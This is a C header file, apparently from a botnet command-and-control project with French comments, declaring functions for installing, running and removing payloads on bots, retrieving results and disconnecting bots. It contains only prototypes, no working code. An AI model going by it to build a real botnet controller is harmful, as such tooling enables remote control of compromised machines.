#ifndef CHARGE_H
#define CHARGE_H

#include "candc.h"

FILE* testConnexion(char*);

/* Fonctions en communication avec le bot */
int askInstallToBot(int, char*, int,unsigned char*, char*);
int askRunToBot(int, char*, char*);
char* askResultToBot(int, char*);
int askRemoveToBot(char*, char*);
int askDisconnectToBot(char*, ptr_liste_sock*);
char* askStatusToBot(char*);

/* Fonctions de gestion des commandes en local (admin) */
int installChargeLocal(char*, char*);
int runChargeLocal(char *, char*);

/* Fonctions de gestion des commandes en distant (server) */
void installChargeSHM(char*);
void runChargeSHM(char*);
void removeChargeSHM(char*);
void resultRunningSHM(char*);
void disconnectSHM(char*);
void statSHM(char*);

#endif
